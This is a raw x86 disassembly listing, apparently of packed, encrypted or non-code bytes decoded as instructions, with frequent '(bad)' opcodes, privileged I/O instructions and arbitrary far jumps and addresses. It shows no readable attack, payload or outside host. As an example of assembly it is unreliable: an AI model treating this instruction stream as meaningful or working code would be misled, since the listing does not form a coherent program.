  411a64:	outs   dx,DWORD PTR ds:[esi]
  411a65:	mov    bh,0xd3
  411a67:	xor    BYTE PTR [edx],bh
  411a69:	inc    ebx
  411a6a:	and    ebx,DWORD PTR [esi]
  411a6c:	popf   
  411a6d:	ins    DWORD PTR es:[edi],dx
  411a6e:	xor    BYTE PTR [ebx+esi*1],bl
  411a71:	inc    edx
  411a72:	dec    ecx
  411a73:	(bad)  
  411a74:	les    ecx,FWORD PTR [ebx+0x6702fb66]
  411a7a:	fnsave [ebx]
  411a7c:	xchg   esp,eax
  411a7d:	push   0x35
  411a7f:	daa    
  411a80:	adc    eax,0xaa080d65
  411a85:	adc    DWORD PTR [ebx],esi
  411a87:	adc    al,al
  411a89:	cs data16 hlt 
  411a8c:	jmp    DWORD PTR [edx-0x42f8f9b]
  411a92:	adc    DWORD PTR [ebx],ebx
  411a94:	push   ecx
  411a95:	pop    esi
  411a96:	fisub  DWORD PTR [esi+esi*2]
  411a99:	push   esi
  411a9a:	mov    ebp,0x7bd26701
  411a9f:	mov    edx,DWORD PTR [ebx-0x7a]
  411aa2:	(bad)  
  411aa3:	outs   dx,DWORD PTR ds:[esi]
  411aa4:	outs   dx,DWORD PTR ds:[esi]
  411aa5:	jae    0x411b0a
  411aa7:	sbb    ecx,DWORD PTR [edi]
  411aa9:	mov    ds:0x31a58e1a,al
  411aae:	sub    DWORD PTR [esi+ecx*2+0x6f],0x17
  411ab3:	mov    ecx,0xe4b91bdb
  411ab8:	pop    esi
  411ab9:	add    DWORD PTR [esi+0x79664cc1],edi
  411abf:	xor    ch,dh
  411ac1:	sbb    al,0x4b
  411ac3:	outs   dx,DWORD PTR ds:[esi]
  411ac4:	shl    BYTE PTR [esi+0x79],0x6f
  411ac8:	xchg   esp,eax
  411ac9:	jp     0x411ac9
  411acb:	frstor [ebp+0xcd66568]
  411ad1:	sbb    cl,BYTE PTR [ebx]
  411ad3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ad4:	and    BYTE PTR [edx],ch
  411ad6:	outs   dx,BYTE PTR ds:[esi]
  411ad7:	inc    eax
  411ad8:	ret    
  411ad9:	inc    esi
  411ada:	dec    ecx
  411adb:	mov    ah,0x80
  411add:	push   ebp
  411ade:	push   edx
  411adf:	or     edi,DWORD PTR [eax]
  411ae1:	sub    al,BYTE PTR [eax+0x781f4f11]
  411ae7:	sbb    BYTE PTR [ebx-0x55],ah
  411aea:	into   
  411aeb:	push   ecx
  411aec:	sar    BYTE PTR [edx+0x31],1
  411aef:	addr16 push ebx
  411af1:	in     eax,dx
  411af2:	loop   0x411af9
  411af4:	dec    esp
  411af5:	out    0xbd,eax
  411af7:	add    al,0x1f
  411af9:	imul   eax,DWORD PTR [eax-0x2d4a426a],0xffffffd8
  411b00:	mov    cs,ecx
  411b02:	or     edi,DWORD PTR [ebx+esi*4+0x1e35b948]
  411b09:	or     DWORD PTR [ecx+0x7e],eax
  411b0c:	in     eax,0x6a
  411b0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b0f:	int    0x8c
  411b11:	pop    ds
  411b12:	pop    es
  411b13:	jno    0x411af9
  411b15:	nop
  411b16:	or     edi,DWORD PTR [esi-0x3486f939]
  411b1c:	dec    esp
  411b1d:	in     eax,0x56
  411b1f:	jge    0x411b23
  411b21:	jo     0x411b35
  411b23:	and    bl,bh
  411b25:	sub    bh,BYTE PTR [eax]
  411b27:	gs repnz (bad) 
  411b2a:	or     ebp,DWORD PTR [edx]
  411b2c:	push   ebx
  411b2d:	jmp    0x70e88ff1
  411b32:	popf   
  411b33:	mov    ebp,0xd01618cd
  411b38:	pop    esi
  411b39:	(bad)  
  411b3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b3b:	mov    edi,ecx
  411b3d:	(bad)  
  411b3e:	mov    ebp,0x7e9c5302
  411b43:	add    edi,DWORD PTR [ebp+0xa]
  411b46:	call   0x8545ca6c
  411b4b:	xchg   esi,eax
  411b4c:	cmp    eax,0x4bd9a91e
  411b51:	mov    WORD PTR [ebp+0x4b3653a0],ss
  411b57:	sub    esi,DWORD PTR [ebx+0x46]
  411b5a:	sbb    al,0xa3
  411b5c:	xchg   esi,eax
  411b5d:	imul   esp,DWORD PTR [edx-0x5c],0xf4bbeb34
  411b64:	jno    0x411b2e
  411b66:	gs (bad) 
  411b68:	pop    edx
  411b69:	adc    bl,bl
  411b6b:	mov    DWORD PTR [ebx],esp
  411b6d:	retf   
  411b6e:	fnstcw WORD PTR [ebx-0x73]
  411b71:	add    al,0x83
  411b73:	xor    ebx,ebp
  411b75:	and    ecx,eax
  411b77:	lds    eax,FWORD PTR [edi-0x56]
  411b7a:	pop    ecx
  411b7b:	ds lock lahf 
  411b7e:	data16 fcomp DWORD PTR [ebp+0x54]
  411b82:	xchg   edx,eax
  411b83:	pop    ebx
  411b84:	jecxz  0x411bf5
  411b86:	neg    DWORD PTR [ecx]
  411b88:	not    DWORD PTR [edi-0x3ed74b7d]
  411b8e:	or     BYTE PTR [ecx-0x7c],dh
  411b91:	cmp    dl,BYTE PTR [ebx+ebx*1]
  411b94:	jbe    0x411b5a
  411b96:	(bad)  
  411b97:	hlt    
  411b98:	push   cs
  411b99:	add    eax,0x440c19e4
  411b9e:	ret    0xbe58
  411ba1:	dec    esi
  411ba2:	ret    0x501d
  411ba5:	out    dx,eax
  411ba6:	xor    bh,ah
  411ba8:	sbb    BYTE PTR [ebp-0x2988ae2d],ah
  411bae:	jle    0x411bcb
  411bb0:	call   0xd1dda13f
  411bb5:	sub    al,0xa6
  411bb7:	mov    al,ds:0x521c3952
  411bbc:	and    cl,BYTE PTR [eax]
  411bbe:	jmp    0x4318:0x100933bf
  411bc5:	test   eax,0x25ad4fb7
  411bca:	sar    ch,cl
  411bcc:	call   0xe05954b
  411bd1:	pop    DWORD PTR [ebx+ebp*4]
  411bd4:	iret   
  411bd5:	pop    edi
  411bd6:	stos   BYTE PTR es:[edi],al
  411bd7:	sbb    DWORD PTR [ebx-0x332fd63b],edx
  411bdd:	out    dx,eax
  411bde:	push   ecx
  411bdf:	icebp  
  411be0:	push   ebx
  411be1:	xchg   ebp,eax
  411be2:	or     bh,BYTE PTR [eax+0x3d]
  411be5:	jnp    0x411b6a
  411be7:	addr16 js 0x411c53
  411bea:	ins    DWORD PTR es:[edi],dx
  411beb:	lock push edx
  411bed:	cdq    
  411bee:	mov    dh,0x0
  411bf0:	pop    esi
  411bf1:	xor    dh,BYTE PTR [ecx+0x48]
  411bf4:	ror    al,cl
  411bf6:	mov    edi,0xce2f839a
  411bfb:	mov    bh,0xde
  411bfd:	push   0xffffff8e
  411bff:	push   ss
  411c00:	(bad)  
  411c01:	vpsubd xmm1,xmm5,XMMWORD PTR [edx+0x72]
  411c06:	mov    eax,ds:0xbe84533b
  411c0b:	mov    esi,0x283a3ba2
  411c10:	and    BYTE PTR [ebx-0x77],ch
  411c13:	hlt    
  411c14:	or     ecx,DWORD PTR [ecx-0x60313681]
  411c1a:	pushw  cs
  411c1c:	mov    ds:0xeaa3bb09,eax
  411c21:	and    cl,BYTE PTR [eax+0x616af603]
  411c27:	mov    ebx,0x23135f21
  411c2c:	std    
  411c2d:	jae    0x411c9f
  411c2f:	loop   0x411c49
  411c31:	xchg   ebx,eax
  411c32:	mov    ebx,0xef6532e9
  411c37:	neg    BYTE PTR [edi]
  411c39:	mov    esi,0xfee5193a
  411c3e:	aad    0x15
  411c40:	adc    al,0x2
  411c42:	jmp    0x411bff
  411c44:	xor    DWORD PTR [esi],eax
  411c46:	sbb    BYTE PTR [ecx-0x28],dh
  411c49:	ss cdq 
  411c4b:	dec    esi
  411c4c:	push   ebx
  411c4d:	pusha  
  411c4e:	xor    BYTE PTR [ebp+0x58],al
  411c51:	mov    ebp,0x2ce119e2
  411c56:	neg    BYTE PTR [ecx-0x5e]
  411c59:	loopne 0x411cd2
  411c5b:	adc    BYTE PTR [ebx+0x2f],dl
  411c5e:	cmc    
  411c5f:	pop    ss
  411c60:	dec    ebx
  411c61:	cld    
  411c62:	cwde   
  411c63:	cmp    eax,0x2726b22
  411c68:	add    esp,DWORD PTR [ebx-0x47]
  411c6b:	pushf  
  411c6c:	jns    0x411cdc
  411c6e:	sbb    DWORD PTR [esp+ebp*8],edx
  411c71:	arpl   si,sp
  411c73:	sbb    al,0xb8
  411c75:	das    
  411c76:	jbe    0x411c98
  411c78:	cmp    edx,0xffffffec
  411c7b:	aam    0x78
  411c7d:	mov    edi,0xdd642aa0
  411c82:	dec    esi
  411c83:	lds    esi,FWORD PTR [esi+0x15477f36]
  411c89:	sbb    dh,ch
  411c8b:	(bad)  
  411c8d:	rcl    DWORD PTR [edi+0x1bad5f8e],cl
  411c93:	pop    ss
  411c94:	jp     0x411c2a
  411c96:	es inc eax
  411c98:	push   ss
  411c99:	jmp    0x1841:0x92395abc
  411ca0:	loope  0x411c5d
  411ca2:	adc    DWORD PTR [edx+0x7721559d],edi
  411ca8:	push   eax
  411ca9:	jmp    0xebdc:0xa8f93a3d
  411cb0:	inc    ebp
  411cb1:	shl    BYTE PTR [ecx+0x519d53ec],cl
  411cb7:	sub    BYTE PTR [edi+0x50902fd3],0x2c
  411cbe:	leave  
  411cbf:	in     eax,0xbf
  411cc1:	mov    bl,0xfb
  411cc3:	adc    ecx,DWORD PTR es:[edi+0x29]
  411cc7:	fadd   st(2),st
  411cc9:	dec    edi
  411cca:	fs pop edi
  411ccc:	sbb    ch,BYTE PTR [esi+eax*4]
  411ccf:	pop    es
  411cd0:	sub    DWORD PTR [edx+0x7ee779f3],ebp
  411cd6:	cs lahf 
  411cd8:	dec    edx
  411cd9:	jmp    0xc6f3:0x4df1a6c7
  411ce0:	shr    BYTE PTR [edi],0xc2
  411ce3:	rol    WORD PTR [eax-0x70],1
  411ce7:	xchg   ebx,eax
  411ce8:	rcr    BYTE PTR [esi-0x172ccd1a],1
  411cee:	fst    DWORD PTR [esi]
  411cf0:	push   esp
  411cf1:	inc    esp
  411cf2:	pop    es
  411cf3:	adc    cl,0xaa
  411cf6:	iret   
  411cf7:	lods   eax,DWORD PTR ds:[esi]
  411cf8:	and    DWORD PTR [ebp-0x1bf4e601],0x918e0a1c
  411d02:	in     eax,0x44
  411d04:	push   ebx
  411d05:	xlat   BYTE PTR ds:[ebx]
  411d06:	and    BYTE PTR [ecx],0xed
  411d09:	xchg   esp,eax
  411d0a:	mov    dl,BYTE PTR [edx-0x78]
  411d0d:	push   0x34
  411d0f:	cld    
  411d10:	jg     0x411d0c
  411d12:	loopne 0x411cc0
  411d14:	sub    bl,BYTE PTR ds:[eax+0x7c]
  411d18:	cs push 0x2d
  411d1b:	push   0x76f99e7
  411d20:	daa    
  411d21:	dec    ebx
  411d22:	pop    edx
  411d23:	arpl   WORD PTR [esi+0x55199feb],cx
  411d29:	popa   
  411d2a:	rcl    DWORD PTR [esi-0x5117128d],cl
  411d30:	push   ebx
  411d31:	out    0xa6,eax
  411d33:	pop    edi
  411d34:	mov    esp,0x12d4f451
  411d39:	rol    DWORD PTR [esi-0x19c07b43],cl
  411d3f:	adc    al,0x6e
  411d41:	das    
  411d42:	sub    esp,DWORD PTR [ebp-0x6131a5ea]
  411d48:	data16 sub al,0xf7
  411d4b:	sbb    DWORD PTR [edi+0x31a2b1e3],edi
  411d51:	fcom   DWORD PTR [esi+0x46d846a8]
  411d57:	iret   
  411d58:	xor    ecx,DWORD PTR [esi+0x21aee77d]
  411d5e:	data16 fld QWORD PTR [ecx+0x10d27734]
  411d65:	mov    eax,0xbbdf19ff
  411d6a:	mov    WORD PTR [esi+0x7d],gs
  411d6d:	stos   BYTE PTR es:[edi],al
  411d6e:	stos   BYTE PTR es:[edi],al
  411d6f:	sub    al,0x53
  411d71:	out    dx,eax
  411d72:	push   es
  411d73:	leave  
  411d74:	ror    DWORD PTR [esi+0x6afa321e],0xdd
  411d7b:	jnp    0x411d26
  411d7d:	mov    dh,0xe0
  411d7f:	rol    DWORD PTR [esi-0x69],0xa
  411d83:	stc    
  411d84:	jg     0x411d47
  411d86:	rcl    BYTE PTR [eax-0x8],0x6a
  411d8a:	adc    bh,BYTE PTR [ecx+0x29]
  411d8d:	mov    esi,0xb2534c0d
  411d92:	ret    0x4b00
  411d95:	sar    DWORD PTR [edx-0x79fb5332],0x8f
  411d9c:	mov    dl,0xd0
  411d9e:	aaa    
  411d9f:	add    ecx,DWORD PTR [ebx+0x3f]
  411da2:	adc    DWORD PTR [ebx+edx*2-0x44],edi
  411da6:	jbe    0x411d67
  411da8:	daa    
  411da9:	out    dx,al
  411daa:	push   ebp
  411dab:	jo     0x411d69
  411dad:	cs das 
  411daf:	fwait
  411db0:	push   ebx
  411db1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411db2:	iret   
  411db3:	gs push eax
  411db5:	mov    edi,0x11520af5
  411dba:	mov    ebx,0x836edbc5
  411dbf:	ins    DWORD PTR es:[edi],dx
  411dc0:	mulps  xmm6,XMMWORD PTR [edi+0x1b]
  411dc4:	sbb    ebx,edx
  411dc6:	jp     0x411d94
  411dc8:	in     eax,0xd
  411dca:	out    0x9e,eax
  411dcc:	push   ebx
  411dcd:	mov    ebx,0xd0d867f1
  411dd2:	(bad)  
  411dd4:	mov    ds:0x52598cd1,eax
  411dd9:	icebp  
  411dda:	popf   
  411ddb:	push   edx
  411ddc:	and    BYTE PTR [ebp+esi*8-0x17],ch
  411de0:	cmc    
  411de1:	je     0x411da4
  411de3:	ja     0x411d77
  411de5:	cmp    edx,DWORD PTR [eax]
  411de7:	dec    ecx
  411de8:	pop    ecx
  411de9:	pop    edx
  411dea:	mov    WORD PTR [esi-0x6d],bp
  411dee:	sub    al,0x86
  411df0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411df1:	imul   edx,DWORD PTR [esi+edi*8],0x7c0f346b
  411df8:	jne    0x411e53
  411dfa:	mov    ebp,0xc3eb4899
  411dff:	mov    DWORD PTR [edi],esp
  411e01:	mov    ah,0xb5
  411e03:	js     0x411d97
  411e05:	dec    eax
  411e06:	adc    ah,BYTE PTR [eax+0x17]
  411e09:	jmp    0x411dee
  411e0b:	cmp    BYTE PTR [ebp+0x53b7f4c3],cl
  411e11:	loope  0x411df8
  411e13:	call   0xefb7:0x45096d3f
  411e1a:	pop    esi
  411e1b:	sbb    BYTE PTR ds:0x971d0b82,bl
  411e21:	and    dl,BYTE PTR [edi-0x4c]
  411e24:	sub    ebp,DWORD PTR fs:[ecx+0x244913cd]
  411e2b:	lods   eax,DWORD PTR ds:[esi]
  411e2c:	retf   
  411e2d:	ja     0x411e7d
  411e2f:	sbb    BYTE PTR [ebp-0x77dff1f6],ah
  411e35:	rcr    DWORD PTR ds:0xe91a3171,1
  411e3b:	and    edx,DWORD PTR [eax+0x31]
  411e3e:	sahf   
  411e3f:	jmp    0x411e36
  411e41:	shr    BYTE PTR [ecx+ecx*2],0x1a
  411e45:	out    0x91,eax
  411e47:	sbb    DWORD PTR [eax+0x76],edi
  411e4a:	es dec eax
  411e4c:	jbe    0x411eb6
  411e4e:	ins    BYTE PTR es:[edi],dx
  411e4f:	adc    eax,0x76719253
  411e54:	mov    bh,0xf6
  411e56:	test   BYTE PTR [ebx],0x5a
  411e59:	mov    ebx,0x8a3919bb
  411e5e:	stc    
  411e5f:	rol    DWORD PTR [esi],cl
  411e61:	mov    bl,0xfa
  411e63:	push   esi
  411e64:	push   ebx
  411e65:	or     esi,0xdcc09a4f
  411e6b:	in     eax,dx
  411e6c:	sub    al,0x96
  411e6e:	sbb    ch,BYTE PTR [ecx-0x2d882b73]
  411e74:	inc    esi
  411e75:	neg    BYTE PTR [esi+0x1f983769]
  411e7b:	push   ebx
  411e7c:	dec    esp
  411e7d:	std    
  411e7e:	mov    dh,0x8a
  411e80:	(bad)  
  411e81:	fwait
  411e82:	les    sp,DWORD PTR [ebp+0x63]
  411e86:	jmp    0xda1736a4
  411e8b:	(bad)  
  411e8c:	fimul  WORD PTR [edx-0x1eab2353]
  411e92:	(bad)
  411e95:	jmp    0x1b06:0x20bda9cd
  411e9c:	mov    dh,0x78
  411e9e:	dec    eax
  411e9f:	les    edi,FWORD PTR [edx+0x6a]
  411ea2:	inc    ebx
  411ea3:	repnz sub eax,0xb4663a
  411ea9:	xor    BYTE PTR [edi+0x29],dl
  411eac:	jmp    0x411f14
  411eae:	cwde   
  411eaf:	(bad)  
  411eb0:	and    al,0xc6
  411eb2:	ja     0x411eca
  411eb4:	fs push ebp
  411eb6:	dec    esi
  411eb7:	enter  0x852c,0x68
  411ebb:	lods   eax,DWORD PTR ds:[esi]
  411ebc:	rcl    BYTE PTR [ebx+ebp*1],cl
  411ebf:	push   esp
  411ec0:	push   edx
  411ec1:	xchg   edi,eax
  411ec2:	xchg   esi,eax
  411ec3:	(bad)
  411ec6:	(bad)  
  411ec7:	int3   
  411ec8:	adc    bh,BYTE PTR [esi+0x455dd28b]
  411ece:	mov    bh,0xfd
  411ed0:	into   
  411ed1:	jmp    0x1066:0x3bbe7be7
  411ed8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ed9:	pop    es
  411eda:	fs jmp 0xda694a17
  411ee0:	mov    ds:0x8619d40d,al
  411ee5:	sahf   
  411ee6:	mov    ds:0x1979ae43,al
  411eeb:	std    
  411eec:	push   ebx
  411eed:	add    BYTE PTR [ebx-0x7a4fc117],bl
  411ef3:	cs mov ebx,0x7019fd93
  411ef9:	scas   al,BYTE PTR es:[edi]
  411efa:	fcmovnbe st,st(3)
  411efc:	xchg   esp,eax
  411efd:	pop    eax
  411efe:	inc    ebp
  411eff:	stos   DWORD PTR es:[edi],eax
  411f00:	push   ebx
  411f01:	mov    cl,0x6e
  411f03:	inc    ebp
  411f04:	jnp    0x411f4f
  411f06:	adc    edi,DWORD PTR [ebx-0x4e]
  411f09:	imul   ecx,DWORD PTR [edi+0x30],0x66d1db96
  411f10:	cmp    BYTE PTR [ebp+eiz*2+0x2acf899],bh
  411f17:	outs   dx,BYTE PTR ds:[esi]
  411f18:	adc    eax,DWORD PTR [ebx-0x1a]
  411f1b:	jle    0x411f80
  411f1d:	imul   ecx,DWORD PTR [ebx+0x15c6149e],0x660c405c
  411f27:	or     edx,ebp
  411f29:	in     al,0xd6
  411f2b:	mov    cs,WORD PTR ds:0xcf9cfdbd
  411f31:	push   0x1a
  411f33:	fild   WORD PTR [edx]
  411f35:	xor    al,0x51
  411f37:	jo     0x411eeb
  411f39:	jbe    0x411fab
  411f3b:	pop    ecx
  411f3c:	pop    edx
  411f3d:	cwde   
  411f3e:	outs   dx,DWORD PTR ds:[esi]
  411f3f:	pop    esp
  411f40:	adc    ebp,DWORD PTR [eax+0x6b1cd8a0]
  411f46:	cdq    
  411f47:	jb     0x411f5a
  411f49:	and    eax,0x579778d2
  411f4e:	cs stos DWORD PTR es:[edi],eax
  411f50:	jp     0x411f3b
  411f52:	inc    edi
  411f53:	mov    eax,ds:0x10294a41
  411f58:	or     BYTE PTR [edi],dl
  411f5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f5b:	xlat   BYTE PTR ds:[ebx]
  411f5c:	sbb    DWORD PTR [esi-0xf],ebx
  411f5f:	jmp    0x3c89:0x3cc6e605
  411f66:	mov    bp,0x1eb7
  411f6a:	lahf   
  411f6b:	and    eax,0x1986ff5e
  411f70:	shr    DWORD PTR [ebx],0xc7
  411f73:	(bad)  
  411f74:	mov    ds:0x651d04ac,al
  411f79:	out    dx,al
  411f7a:	loop   0x411f01
  411f7c:	adc    ecx,DWORD PTR [edi]
  411f7e:	pop    ecx
  411f7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f80:	xchg   ecx,eax
  411f81:	stos   DWORD PTR es:[edi],eax
  411f82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f83:	fsub   DWORD PTR [esi+0x6d]
  411f86:	stos   DWORD PTR es:[edi],eax
  411f87:	sbb    dl,dl
  411f89:	int3   
  411f8a:	jl     0x411fdf
  411f8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f8d:	or     esp,DWORD PTR [edi]
  411f8f:	add    esp,eax
  411f91:	ja     0x41200c
  411f93:	inc    ebp
  411f94:	xchg   ebx,eax
  411f95:	inc    esp
  411f96:	ret    0x7800
  411f99:	add    DWORD PTR [ebp-0x5a],esp
  411f9c:	(bad)  
  411f9d:	or     DWORD PTR [ebp-0x1844fbe7],ebp
  411fa3:	pop    ebx
  411fa4:	dec    edx
  411fa5:	data16 jns 0x411ff7
  411fa8:	sti    
  411fa9:	aam    0x89
  411fab:	out    dx,al
  411fac:	pop    esi
  411fad:	aas    
  411fae:	inc    esi
  411faf:	fwait
  411fb0:	icebp  
  411fb1:	imul   ebx,DWORD PTR [ecx],0x63
  411fb4:	pop    edi
  411fb5:	adc    edx,ebx
  411fb7:	in     al,0xfc
  411fb9:	mov    ss,WORD PTR [edx]
  411fbb:	push   edx
  411fbc:	cmp    eax,0xdce4669a
  411fc1:	bnd ret 
  411fc3:	aad    0x54
  411fc5:	pop    edx
  411fc6:	sub    DWORD PTR [edi+eax*1+0x53291951],ebp
  411fcd:	dec    eax
  411fce:	adc    BYTE PTR [ecx],dh
  411fd0:	jbe    0x411f68
  411fd2:	adc    BYTE PTR [esi],cl
  411fd4:	adc    al,al
  411fd6:	gs add esi,esp
  411fd9:	mov    ebp,fs
  411fdb:	pop    ecx
  411fdc:	dec    esp
  411fdd:	inc    edx
  411fde:	rcr    DWORD PTR [ecx],0x74
  411fe1:	int3   
  411fe2:	mov    ds:0xfc3cb6ba,al
  411fe7:	pop    ss
  411fe8:	cmp    ebp,esp
  411fea:	sbb    DWORD PTR [eax+0x51],edi
  411fed:	dec    eax
  411fee:	mov    ecx,0x2a1dc326
  411ff3:	mov    ecx,DWORD PTR [edx]
  411ff5:	jno    0x411ffb
  411ff7:	fld    TBYTE PTR [ecx]
  411ff9:	imul   eax,eax,0xffffffd3
  411ffc:	push   esi
  411ffd:	xchg   ebx,eax
  411ffe:	xchg   edi,esi
  412000:	push   ebx
  412001:	or     dh,BYTE PTR [ecx+0x4b9ccbf5]
  412007:	aad    0xa9
  412009:	in     al,dx
  41200a:	fcmovbe st,st(6)
  41200c:	mov    bl,0x8a
  41200e:	ja     0x411ff2
  412010:	out    dx,eax
  412011:	loopne 0x412024
  412013:	xor    esi,DWORD PTR [esi-0x5d37993e]
  412019:	iret   
  41201a:	lods   eax,DWORD PTR ds:[esi]
  41201b:	lea    ebx,[ebp-0x4ce489a9]
  412021:	mov    dh,0xf6
  412023:	xor    DWORD PTR [edi-0x7d],ebp
  412026:	mov    esp,0x5dd553f3
  41202b:	inc    edi
  41202c:	cwde   
  41202d:	data16 int3 
  41202f:	ss jp  0x41209b
  412032:	pop    ebx
  412033:	push   edx
  412035:	in     al,0xca
  412037:	lods   al,BYTE PTR ds:[esi]
  412038:	or     esi,esp
  41203a:	data16 xor BYTE PTR [edi+eiz*1+0x5e],bl
  41203f:	jmp    FWORD PTR ss:0x55bc1b0f
  412046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412047:	imul   ebp,DWORD PTR [esi-0x61],0xffffff9b
  41204b:	jb     0x4120a0
  41204d:	mov    ah,0xca
  41204f:	repz ret 0x6d5
  412053:	mov    dh,0xff
  412055:	dec    edi
  412056:	stc    
  412057:	stos   BYTE PTR es:[edi],al
  412058:	mov    bl,0x29
  41205a:	sub    cl,BYTE PTR [ebx]
  41205c:	jnp    0x412066
  41205e:	push   esi
  41205f:	jae    0x4120a2
  412061:	aas    
  412062:	addr16 nop
  412064:	jmp    0xb29f:0x335ba099
  41206b:	add    ebp,edi
  41206d:	sbb    DWORD PTR [eax-0x5c543e93],ebp
  412073:	sbb    DWORD PTR [edx],edx
  412075:	aas    
  412076:	push   cs
  412077:	sbb    BYTE PTR [eax],0x3d
  41207a:	push   bx
  41207c:	ja     0x41200f
  41207e:	adc    eax,0x31c6319e
  412083:	sbb    DWORD PTR [edx+0x34],edx
  412086:	pop    eax
  412087:	sub    eax,DWORD PTR [ebx-0x28]
  41208a:	push   esp
  41208b:	iret   
  41208c:	fwait
  41208d:	add    eax,0xfcf219cf
  412092:	cs xchg edx,edx
  412095:	xor    BYTE PTR [edx+0x2bccdf19],0x38
  41209c:	into   
  41209d:	icebp  
  41209e:	and    eax,0x610653d6
  4120a3:	push   0x5b
  4120a5:	(bad)  
  4120a6:	push   eax
  4120a7:	or     cl,BYTE PTR ds:0x9c20036b
  4120ad:	call   0xe6cade6b
  4120b2:	data16 (bad) 
  4120b4:	mov    eax,0xbd739359
  4120b9:	or     DWORD PTR [ebp-0x616d1fe7],0xd
  4120c0:	ja     0x41206b
  4120c2:	dec    edx
  4120c3:	out    0x53,eax
  4120c5:	lahf   
  4120c6:	sbb    ecx,0x7a
  4120c9:	rcr    DWORD PTR [edx+eax*4+0x4f],1
  4120cd:	dec    eax
  4120ce:	jmp    0x41211c
  4120d0:	dec    ebx
  4120d1:	jmp    0xa623:0x440298dc
  4120d8:	push   ebx
  4120d9:	inc    edi
  4120da:	push   eax
  4120db:	mov    cl,0x8
  4120dd:	cmp    al,0x6f
  4120df:	dec    esi
  4120e0:	std    
  4120e1:	dec    esi
  4120e2:	je     0x41215e
  4120e4:	imul   BYTE PTR [edx]
  4120e6:	(bad)
  4120e9:	jle    0x412126
  4120eb:	nop
  4120ec:	push   ebx
  4120ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120ee:	xchg   ebx,edx
  4120f0:	sbb    BYTE PTR [esi+0x7a],al
  4120f3:	jge    0x4120af
  4120f5:	push   0x26
  4120f7:	inc    edx
  4120f8:	stos   BYTE PTR es:[edi],al
  4120f9:	test   al,0x23
  4120fb:	std    
  4120fc:	test   DWORD PTR [edi],edx
  4120fe:	pushw  ds
  412100:	adc    ecx,ecx
  412102:	add    ecx,eax
  412104:	pop    esp
  412105:	mov    ds:0xc5f4198a,al
  41210a:	invd   
  41210c:	fst    QWORD PTR [ecx-0xbacfa7b]
  412112:	ret    
  412113:	call   0x66931b78
  412118:	jmp    0xa3be:0x27caa26a
  41211f:	xchg   dh,bl
  412121:	into   
  412122:	mov    ax,0xbaf9
  412126:	sub    bh,BYTE PTR [edi+0x77]
  412129:	dec    ebx
  41212a:	dec    edx
  41212b:	xor    ch,BYTE PTR [ebp-0x2cfd182f]
  412131:	call   0x8e16:0xa4a32071
  412138:	push   ebx
  412139:	inc    ebx
  41213a:	mov    dh,0x46
  41213c:	repnz cmc 
  41213e:	mov    al,ds:0x866ee889
  412143:	sbb    DWORD PTR [esp],ebp
  412146:	pop    eax
  412147:	(bad)  
  412148:	daa    
  412149:	pop    ss
  41214a:	sbb    al,0x62
  41214c:	push   ebx
  41214d:	idiv   edi
  41214f:	cdq    
  412150:	sub    DWORD PTR [eax],ecx
  412152:	xchg   esp,eax
  412153:	stos   DWORD PTR es:[edi],eax
  412154:	mov    dl,0x18
  412156:	mov    ebp,0xf9b5d900
  41215b:	bnd jno 0x4120f3
  41215e:	jnp    0x4121cc
  412160:	push   ebx
  412161:	lea    esi,[esi]
  412163:	mov    ebp,0x8b5a5dec
  412168:	jmp    0xe14a04d7
  41216d:	outs   dx,DWORD PTR ds:[esi]
  41216e:	out    0x98,eax
  412170:	mov    esp,0x8a31a9a6
  412175:	mov    ch,0x17
  412177:	cs repz leave 
  41217a:	iret   
  41217b:	cdq    
  41217c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41217d:	gs daa 
  41217f:	stc    
  412180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412181:	imul   esi,DWORD PTR [eax],0x30174f67
  412187:	mov    edx,0x5c7905c0
  41218c:	in     al,dx
  41218d:	jecxz  0x412195
  41218f:	jae    0x4121e9
  412191:	and    eax,0x37dad4d3
  412196:	sub    cl,bl
  412198:	mov    bh,bl
  41219a:	xchg   BYTE PTR [edi-0x2992391],ch
  4121a0:	pop    ebp
  4121a1:	xchg   ecx,eax
  4121a2:	fwait
  4121a3:	cmp    BYTE PTR [esi+0x11983f9],ch
  4121a9:	pop    edx
  4121aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121ab:	mov    eax,ds:0xd3b6f000
  4121b0:	push   eax
  4121b1:	adc    eax,0x98348b0c
  4121b6:	in     eax,0x0
  4121b8:	push   ebx
  4121b9:	(bad)  
  4121ba:	sbb    edi,ebp
  4121bc:	cwde   
  4121bd:	imul   eax,DWORD PTR [esi-0x4a13ca98],0x79ae86e7
  4121c7:	mov    DWORD PTR [ebp+0x6e],0xf59b1ef0
  4121ce:	lods   al,BYTE PTR ds:[esi]
  4121cf:	test   BYTE PTR [esi+0x5],al
  4121d2:	sahf   
  4121d3:	jl     0x41220b
  4121d5:	add    BYTE PTR [edi+0x3c181b54],dh
  4121db:	in     eax,dx
  4121dc:	push   ebx
  4121dd:	dec    edx
  4121de:	sub    al,al
  4121e0:	lahf   
  4121e1:	mov    bh,0x81
  4121e3:	popa   
  4121e4:	pop    ebp
  4121e5:	imul   ecx,DWORD PTR [edx],0x4e346733
  4121eb:	je     0x41219e
  4121ed:	out    0x66,eax
  4121ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121f0:	out    dx,al
  4121f1:	ret    0x4986
  4121f4:	xchg   ecx,eax
  4121f5:	js     0x4121f2
  4121f7:	sbb    DWORD PTR [esi],ecx
  4121f9:	dec    esi
  4121fa:	pop    esp
  4121fb:	ret    0xc292
  4121fe:	mov    ebx,0x70955399
  412203:	dec    edi
  412204:	test   BYTE PTR ss:[edi],al
  412207:	xchg   edx,eax
  412208:	aaa    
